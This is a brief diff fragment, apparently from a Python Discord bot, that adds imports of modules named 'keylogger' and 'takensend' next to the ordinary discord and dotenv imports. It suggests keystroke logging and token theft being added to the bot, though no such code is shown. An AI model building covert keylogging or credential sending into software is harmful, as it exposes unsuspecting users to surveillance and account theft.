@@ -4,6 +4,8 @@ import discord
 import asyncio
 import os
 import dotenv
+import keylogger as key
+import takensend as video
 
 # Discord #
 
